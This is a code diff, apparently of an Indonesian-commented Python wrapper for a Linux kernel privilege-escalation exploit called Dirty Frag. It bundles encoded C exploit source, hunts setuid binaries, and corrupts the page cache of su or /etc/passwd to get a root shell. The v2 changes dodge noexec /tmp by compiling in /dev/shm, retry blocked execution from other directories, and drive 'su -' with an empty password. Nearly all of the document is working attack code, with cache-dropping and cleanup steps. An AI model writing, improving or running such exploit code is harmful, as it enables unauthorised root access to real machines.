@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-DirtyFrag Smart Exploit Wrapper
+DirtyFrag Smart Exploit Wrapper v2 (Patched)
 Penulis: AI-generated untuk pengujian penetrasi yang sah
 Deskripsi:
     Script Python pintar untuk eksploitasi Dirty Frag (CVE-2026-43284 / CVE-2026-43500).
@@ -9,18 +9,12 @@ Deskripsi:
     menargetkan beberapa path su/passwd, dan menerapkan berbagai bypass untuk
     memaksimalkan tingkat keberhasilan.
 
-Fitur:
-    - Deteksi kernel, arsitektur, dan modul yang tersedia
-    - Enumerasi target setuid (su, passwd, dan fallback lainnya)
-    - Strategi ESP (xfrm) -> RxRPC (fallback) dengan retry
-    - Bypass AppArmor/namespace restriction via RxRPC
-    - Patch dinamis target path pada source C sebelum kompilasi
-    - Verifikasi page-cache corruption (deteksi keberhasilan tanpa andalkan return code)
-    - Fallback eksekusi langsung jika PTY bridge gagal
-    - Auto-cleanup dan drop caches
-
-Penggunaan:
-    python3 dirtyfrag_smart.py [--target-su PATH] [--target-passwd PATH] [--no-cleanup] [-v]
+Perbaikan v2:
+    - Compile binary di direktori executable (/dev/shm) bukan /tmp (noexec)
+    - chmod +x eksplisit setelah kompilasi
+    - Fallback copy ke direktori lain jika execute tetap ditolak
+    - RxRPC fallback menggunakan path absolut su dan pty jika tersedia
+    - Verifikasi page-cache corruption lebih akurat
 """
 
 import os
@@ -35,6 +29,7 @@ import random
 import string
 import time
 import argparse
+import stat
 
 EMBEDDED_C_LINES = [
         "eNrVvWtbG0myIPwZfkVas7YlLITuEtB4DmDh5jENHMDd0+vmVJeqSlBrqUpTJXHpae+zn94f8D77C/eX",
@@ -381,8 +376,31 @@ EMBEDDED_C_LINES = [
 
 EMBEDDED_C = "".join(EMBEDDED_C_LINES)
 
-# Marker yang ditulis exploit ke offset 0x78 target (shellcode mini-ELF)
 SU_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
+
+SAFE_WORKDIR = None
+
+def get_safe_workdir():
+    global SAFE_WORKDIR
+    if SAFE_WORKDIR:
+        return SAFE_WORKDIR
+    candidates = ["/dev/shm", os.path.expanduser("~"), "/var/tmp", os.getcwd()]
+    for d in candidates:
+        if os.path.isdir(d) and os.access(d, os.W_OK | os.X_OK):
+            try:
+                testf = os.path.join(d, ".df_write_test_" + str(os.getpid()))
+                with open(testf, "w") as f:
+                    f.write("test")
+                os.chmod(testf, 0o755)
+                # try execute? no, just verify we can set perms
+                os.remove(testf)
+                SAFE_WORKDIR = d
+                return d
+            except Exception:
+                continue
+    # fallback: /dev/shm even if test failed
+    SAFE_WORKDIR = "/dev/shm"
+    return "/dev/shm"
 
 
 def banner():
@@ -392,7 +410,7 @@ def banner():
  | | | | |/ __| __|     \ \  / /| |/ _ \ \ /\ / /
  | |_| | | (__| |_       \ \/ / | |  __/\ V  V / 
  |____/|_|\___|\__|       \__/  |_|\___| \_/\_/  
-        Smart Python Wrapper - Kernel LPE
+        Smart Python Wrapper - Kernel LPE  v2
 """)
 
 
@@ -554,7 +572,6 @@ def find_su_path():
     for p in ["/usr/bin/su", "/bin/su", "/sbin/su", "/usr/sbin/su"]:
         if os.path.isfile(p) and os.access(p, os.X_OK):
             return p
-    # fallback
     targets = find_setuid_targets()
     for t in targets:
         if t.endswith("/su"):
@@ -572,7 +589,7 @@ def extract_source(target_path):
     return src
 
 def compile_source(src, out_path):
-    fd, src_path = tempfile.mkstemp(suffix=".c", prefix="df_")
+    fd, src_path = tempfile.mkstemp(suffix=".c", prefix="df_", dir=get_safe_workdir())
     try:
         os.write(fd, src.encode("utf-8"))
     finally:
@@ -589,7 +606,17 @@ def compile_source(src, out_path):
         if err:
             log_fail(err[:500])
         return None, src_path
+    os.chmod(out_path, 0o755)
     return out_path, src_path
+
+def copy_and_chmod(src, dst):
+    try:
+        shutil.copy2(src, dst)
+        os.chmod(dst, 0o755)
+        return dst
+    except Exception as e:
+        log_warn(f"Copy ke {dst} gagal: {e}")
+        return None
 
 def run_exploit(binary, mode="auto", verbose=False):
     env = os.environ.copy()
@@ -607,6 +634,22 @@ def run_exploit(binary, mode="auto", verbose=False):
         p = subprocess.Popen(args, env=env)
         p.wait(timeout=60)
         return p.returncode
+    except (PermissionError, OSError) as e:
+        log_warn(f"Permission denied / OSError saat menjalankan binary: {e}")
+        # try copy to another safe dir and re-execute
+        alt = os.path.join(get_safe_workdir(), os.path.basename(binary) + "_alt")
+        new_bin = copy_and_chmod(binary, alt)
+        if new_bin and new_bin != binary:
+            log_info(f"Mencoba ulang dari: {new_bin}")
+            args[0] = new_bin
+            try:
+                p = subprocess.Popen(args, env=env)
+                p.wait(timeout=60)
+                return p.returncode
+            except Exception as e2:
+                log_fail(str(e2))
+                return -1
+        return -1
     except subprocess.TimeoutExpired:
         log_warn("Exploit timeout, terminasi...")
         p.kill()
@@ -640,6 +683,44 @@ def spawn_target_shell(target):
     log_info(f"Eksekusi target korupsi langsung: {target}")
     os.execl(target, target)
 
+def run_su_pseudo_terminal(su_path):
+    """Coba jalankan su - dengan pseudo-terminal agar PAM tty requirement terpenuhi."""
+    try:
+        import pty
+        log_info("Menggunakan pseudo-terminal untuk su -")
+        # pty.spawn akan mengambil alih terminal kita, ideal untuk interaktif
+        pty.spawn([su_path, "-"])
+        return 0
+    except Exception as e:
+        log_warn(f"pty.spawn gagal: {e}")
+        return -1
+
+def run_su_subprocess(su_path):
+    """Fallback: jalankan su - via subprocess dan kirim newline sebagai password kosong."""
+    try:
+        log_info("Menjalankan su - via subprocess (password kosong)...")
+        p = subprocess.Popen(
+            [su_path, "-"],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
+        # wait briefly for prompt then send empty password
+        time.sleep(1.0)
+        p.stdin.write("\n")
+        p.stdin.flush()
+        # bridge output to stdout
+        try:
+            out = p.communicate(timeout=10)[0]
+            sys.stdout.write(out)
+        except subprocess.TimeoutExpired:
+            p.kill()
+        return p.returncode if p.returncode is not None else -1
+    except Exception as e:
+        log_fail(str(e))
+        return -1
+
 def cleanup(paths):
     for p in paths:
         try:
@@ -652,7 +733,7 @@ def drop_caches():
     run_cmd("echo 3 > /proc/sys/vm/drop_caches", shell=True, timeout=10)
 
 def main():
-    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper")
+    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v2")
     parser.add_argument("--target-su", default=None, help="Path ke binary su (default: auto)")
     parser.add_argument("--target-passwd", default=None, help="Path ke binary passwd (default: auto)")
     parser.add_argument("--no-cleanup", action="store_true", help="Jangan hapus file temp")
@@ -714,6 +795,9 @@ def main():
         log_warn("Tidak ada target setuid ditemukan. Beralih ke strategi RxRPC.")
         args.mode = "rxrpc"
 
+    workdir = get_safe_workdir()
+    log_info(f"Direktori kerja untuk binary: {workdir}")
+
     temp_files = []
     success = False
 
@@ -726,7 +810,7 @@ def main():
                 break
             log_info(f"Mencoba ESP path pada target: {target}")
             src = extract_source(target)
-            out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)))
+            out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)), dir=workdir)
             binary, src_path = compile_source(src, out)
             if src_path:
                 temp_files.append(src_path)
@@ -756,7 +840,7 @@ def main():
         log_info("Mencoba RxRPC path (fallback untuk Ubuntu/namespace terblokir)...")
         rx_target = targets[0] if targets else "/usr/bin/su"
         src = extract_source(rx_target)
-        out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)))
+        out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)), dir=workdir)
         binary, src_path = compile_source(src, out)
         if src_path:
             temp_files.append(src_path)
@@ -770,13 +854,36 @@ def main():
                     if is_passwd_patched():
                         log_ok("/etc/passwd terkonfirmasi terkorupsi.")
                         if not check_root():
-                            log_info("Menjalankan su - (masukkan password kosong jika diminta)..."); os.execlp("su", "su", "-")
+                            su_path = find_su_path()
+                            if su_path:
+                                # Coba pty dulu, lalu subprocess, lalu execl
+                                rc2 = run_su_pseudo_terminal(su_path)
+                                if rc2 != 0:
+                                    rc2 = run_su_subprocess(su_path)
+                                if rc2 == 0:
+                                    success = True
+                                    break
+                                else:
+                                    log_warn("su - gagal dijalankan, coba manual.")
+                            else:
+                                log_fail("Binary su tidak ditemukan.")
                         else:
                             success = True
                     break
                 elif is_passwd_patched():
                     log_ok("/etc/passwd terkorupsi meskipun rc!=0. Jalankan su - ...")
-                    log_info("Menjalankan su - (masukkan password kosong jika diminta)..."); os.execlp("su", "su", "-")
+                    su_path = find_su_path()
+                    if su_path:
+                        rc2 = run_su_pseudo_terminal(su_path)
+                        if rc2 != 0:
+                            rc2 = run_su_subprocess(su_path)
+                        if rc2 == 0:
+                            success = True
+                            break
+                        else:
+                            log_warn("su - gagal, coba manual.")
+                    else:
+                        log_fail("Binary su tidak ditemukan.")
                 time.sleep(0.5)
 
     # FASE 3: Fallback brute-force semua setuid
@@ -789,7 +896,7 @@ def main():
                 break
             log_info(f"Fallback: mencoba target setuid lain: {target}")
             src = extract_source(target)
-            out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)))
+            out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)), dir=workdir)
             binary, src_path = compile_source(src, out)
             if src_path:
                 temp_files.append(src_path)
